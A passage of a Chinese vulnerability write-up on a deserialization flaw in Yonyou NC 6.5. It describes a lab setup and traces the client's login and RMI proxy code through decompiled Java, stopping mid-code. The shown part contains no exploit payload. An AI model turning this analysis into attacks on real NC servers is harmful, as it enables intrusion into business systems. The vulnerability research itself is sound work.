<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="用友nc-65-反序列化漏洞"><span class="csECDA2D3">用友</span><span class="csDE05BCC">nc 6.5 </span><span class="csECDA2D3">反序列化漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">用友</span><span class="cs8926E06">nc 6.5</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="环境搭建"><span class="csD6CA00D2">环境搭建</span></a></h3>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">1.</span><span class="cs9C1B1871">执行</span><span class="cs8926E06">NC</span><span class="cs9C1B1871">安装包根目录下</span><span class="cs8926E06">setup.bat</span><span class="cs9C1B1871">文件（要求安装盘同级目下有</span><span class="cs8926E06">ufjdk</span><span class="cs9C1B1871">文件或者设置</span><span class="cs8926E06">JAVA_HOME</span><span class="cs9C1B1871">环境变量），安装时，出现如下图界面</span><span class="cs8926E06">;</span></li></ul>
		<p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="363" alt="" style="border-width:0px;" /></span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">2.</span><span class="cs9C1B1871">选择安装的产品，这里我只安装了部分与</span><span class="cs8926E06">NC</span><span class="cs9C1B1871">相关的模块。下面对</span><span class="cs8926E06">NC</span><span class="cs9C1B1871">产品模块做个简要说明</span><span class="cs8926E06">;</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">nc_uap &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">客户化</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_portal &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">企业门户</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_pd &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">工程基础数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_fi &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">财务会计</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_tpb &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">全面计划预算</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_co_cm &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">管理会计</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_tm &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">资金管理</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_scm &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">供应链管理</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_qc &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">质量管理</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_am &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">资产管理</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_mm &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">生产制造</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_hr &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">人力资源</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_hr_pd &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">人力资源预制</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_iufo &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">网络报表含合并报表</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">nc_xbrl &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">集团报表</span><span class="cs9FB05234">XBRL</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">3.</span><span class="cs9C1B1871">至此</span><span class="cs8926E06">NC</span><span class="cs9C1B1871">已安装完成，接下来创建</span><span class="cs8926E06">Oracle</span><span class="cs9C1B1871">用户</span><span class="cs8926E06">;</span></li></ul>
		<p class="cs3A447A38"><span class="cs9FB05234">SQL&gt; create user NCV6.5 identified by 1 default tablespace nnc_data01 temporary tablespace temp; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">SQL&gt; grant dba,connect to NCV6.5;</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">4.</span><span class="cs9C1B1871">配置</span><span class="cs8926E06">sysConfig</span><span class="cs9C1B1871">，产品安装完成之后会自动进入系统配置界面</span><span class="cs8926E06">;</span></li><li class="cs24C36B3"><span class="cs9C1B1871">服务器类型选择</span><span class="cs8926E06">UAP SERVER</span><span class="cs9C1B1871">。点击服务器信息</span><span class="cs8926E06">&rarr;</span><span class="cs9C1B1871">读取，如下图：</span></li></ul>
		<p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="357" alt="" style="border-width:0px;" /></span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">进入</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">数据源页签</span><span class="cs8926E06">&rdquo;&rarr;&ldquo;</span><span class="cs9C1B1871">读取</span><span class="cs8926E06">&rdquo;&rarr;&ldquo;</span><span class="cs9C1B1871">添加</span><span class="cs8926E06">&rdquo;,</span><span class="cs9C1B1871">将</span><span class="cs8926E06">NC V6.5</span><span class="cs9C1B1871">作为账套数据源，数据库类型选择</span><span class="cs8926E06">ORACLE11G</span><span class="cs9C1B1871">，添加数据源名称，不能包含中文。配置数据库地址、用户名密码、失效链接检查周期、</span><span class="cs8926E06">prepareStatement</span><span class="cs9C1B1871">缓存数等信息，完成后点击测试，如果提示测试通过则表示</span><span class="cs8926E06">NC</span><span class="cs9C1B1871">能够与数据库连通，保存即可。</span></li></ul>
		<p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="354" alt="" style="border-width:0px;" /></span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">进入</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">安全日志数据源页签</span><span class="cs8926E06">&rdquo;&rarr;&ldquo;</span><span class="cs9C1B1871">读取</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">，初始化数据源，初始化完成后点击</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">确定</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">。</span></li></ul>
		<p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="357" alt="" style="border-width:0px;" /></span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">进入</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">部署</span><span class="cs8926E06">&rdquo;&rarr;&ldquo;</span><span class="cs9C1B1871">全选</span><span class="cs8926E06">&rdquo;&rarr;&ldquo;</span><span class="cs9C1B1871">部署</span><span class="cs8926E06">EJB&rdquo;</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">此处用于生成、部署</span><span class="cs8926E06">EJB</span><span class="cs9C1B1871">，如下图所示：</span></li></ul>
		<p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="357" alt="" style="border-width:0px;" /></span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">进入</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">文件服务器</span><span class="cs8926E06">&rdquo;&rarr;&ldquo;</span><span class="cs9C1B1871">读取</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">，此处添加服务器</span><span class="cs8926E06">ip</span><span class="cs9C1B1871">地址，端口，存储路径，及选择元数据仓库</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如下图所示：</span></li></ul>
		<p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="353" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">5.</span><span class="cs9C1B1871">环境搭建完成。因为通过浏览器访问的方式需要依赖不同用户设备上的</span><span class="cs8926E06">Java</span><span class="cs9C1B1871">版本以及系统配置等环境因素，所以为了避免这些不必要的麻烦，可以使用专用浏览器</span><span class="cs8926E06">UClient</span><span class="cs9C1B1871">来解决此问题。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="300" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">下载</span><span class="cs8926E06">UClient</span><span class="cs9C1B1871">并安装后，进入启动页面，选择添加应用。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="290" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在其安装目录里发现了</span><span class="cs8926E06">NCLogin65.jar</span><span class="cs9C1B1871">，通过对其反编译进行查看发现，它里面只是一些界面和登录逻辑代码，主要的通信代码并不在该</span><span class="cs8926E06">jar</span><span class="cs9C1B1871">包中。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="242" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续在其他目录下的寻找，发现该目录</span><span class="cs8926E06">(nc_client_home\NCCACHE\CODE)</span><span class="cs9C1B1871">中的子目录含有许多</span><span class="cs8926E06">jar</span><span class="cs9C1B1871">包，其中</span><span class="cs8926E06">external</span><span class="cs9C1B1871">目录中的</span><span class="cs8926E06">jar</span><span class="cs9C1B1871">包是负责客户端与服务端之间通信的逻辑代码。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image9.png" width="560" height="479" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过对登录流程的动态调试，最后找到了对应的类</span><span class="cs8926E06">(nc.login.ui.LoginUISuppor)</span><span class="cs9C1B1871">，并定位到该类中处理登录请示的方法</span><span class="cs8926E06">(getLoginRequest())</span></p><p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image10.png" width="560" height="260" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">执行</span><span class="cs8926E06">getInstance()</span><span class="cs9C1B1871">，获取</span><span class="cs8926E06">NCLocator</span><span class="cs9C1B1871">的实例，然后执行</span><span class="cs8926E06">NCLocator</span><span class="cs9C1B1871">实例的</span><span class="cs8926E06">lookup()</span><span class="cs9C1B1871">方法</span></p><p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image11.png" width="560" height="257" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">查看</span><span class="cs8926E06">nc.bs.framework.common.NCLocator#getInstance(java.util.Properties)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image12.png" width="560" height="259" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">//nc.bs.framework.common.NCLocator#getInstance</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">locator = (NCLocator)locatorMap.get(key);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (locator != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return locator;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!isEmpty(locatorProvider)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;locator = newInstance(locatorProvider);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else if (!isEmpty(svcDispatchURL)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;locator = newInstance(&quot;nc.bs.framework.rmi.RmiNCLocator&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;locator = getDefaultLocator();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;locator.init(props);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;locatorMap.put(key, locator);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return locator;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">由于程序刚启动的时候</span><span class="cs8926E06">locatorMap</span><span class="cs9C1B1871">的值为空，则会进入下面的分支语句中去判断</span><span class="cs8926E06">locatorProvider</span><span class="cs9C1B1871">值，而此时又因为</span><span class="cs8926E06">locatorProvider</span><span class="cs9C1B1871">的值为空，</span><span class="cs8926E06">svcDispatchURL</span><span class="cs9C1B1871">的值</span><span class="cs8926E06">(http://ip:port/ServiceDispatcherServlet)</span><span class="cs9C1B1871">不为空，所以会创建</span><span class="cs8926E06">RmiNCLocator</span><span class="cs9C1B1871">实例，将其存放至</span><span class="cs8926E06">locatorMap</span><span class="cs9C1B1871">中。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">获取到</span><span class="cs8926E06">RmiNCLocator</span><span class="cs9C1B1871">实例后，查看其</span><span class="cs8926E06">lookup()</span><span class="cs9C1B1871">方法：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image13.png" width="560" height="200" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续跟进</span><span class="cs8926E06">nc.bs.framework.server.RemoteMetaContext#lookup()</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image14.png" width="560" height="258" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从</span><span class="cs8926E06">proxyMap</span><span class="cs9C1B1871">中查看是否存在参数</span><span class="cs8926E06">name</span><span class="cs9C1B1871">，如果存在则直接返回，不存在则进入下面的分支。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">查看</span><span class="cs8926E06">getMetaOnDemand()</span><span class="cs9C1B1871">方法：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/用友nc/%e7%94%a8%e5%8f%8bnc%206.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image15.png" width="560" height="255" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到当</span><span class="cs8926E06">metaV0</span><span class="cs9C1B1871">值为空的时候，又调用了</span><span class="cs8926E06">this.remoteMetaContext.lookup()</span><span class="cs9C1B1871">方法，在当前类中搜索</span><span class="cs8926E06">remoteMetaContext</span><span class="cs9C1B1871">，发现在类构造函数中创建了一个代理并将其赋值到</span><span class="cs8926E06">this.remoteMetaContext</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">//nc.bs.framework.rmi.RemoteContextStub#RemoteContextStub</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public RemoteContextStub(String dispatchURL, String module) throws ComponentException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ComponentMetaVO metaVO = new ComponentMetaVO();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;metaVO.setInterfaces(new String[]{Context.class.getName()});</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (module != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;metaVO.setModule(module);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;metaVO.setName(&quot;nc.bs.framework.server.RemoteMetaContext.&quot; + module);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;metaVO.setName(&quot;nc.bs.framework.server.RemoteMetaContext&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.namedMetasMap.put(metaVO.getName(), metaVO);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Address url = null;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url = new Address(dispatchURL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (MalformedURLException var6) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new ComponentException(&quot;invalid url: &quot; + dispatchURL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.defRas = new SimpleRemoteAddressSelector(url);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.remoteMetaContext = (Context)RemoteProxyFactory.getDefault().createRemoteProxy(RemoteContextStub.class.getClassLoader(), metaVO, this.defRas);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.proxyMap.put(metaVO.getName(), this.remoteMetaContext);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.dispatchUrl = url;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.module = module;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.init();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过</span><span class="cs8926E06">java</span><span class="cs9C1B1871">代理的相关知识可以知道，无论调用代理对象的任何方法，该方法都会调用处理器的</span><span class="cs8926E06">invoke</span><span class="cs9C1B1871">方法，在本程序中即是</span><span class="cs8926E06">nc.bs.framework.rmi.RemoteInvocationHandler#invoke</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">//nc.bs.framework.rmi.RemoteInvocationHandler#invoke</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String mn = method.getName();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class&lt;?&gt;[] ps = method.getParameterTypes();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (mn.equals(&quot;equals&quot;) &amp;&amp; ps.length == 1 &amp;&amp; ps[0].equals(Object.class)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object value = args[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (value != null &amp;&amp; Proxy.isProxyClass(value.getClass())) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object h = Proxy.getInvocationHandler(value);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return !(h instanceof RemoteInvocationHandler) ? Boolean.FALSE : this.meta.equals(((RemoteInvocationHandler)h).meta) &amp;&amp; this.ras.equals(((RemoteInvocationHandler)h).ras);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return Boolean.FALSE;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 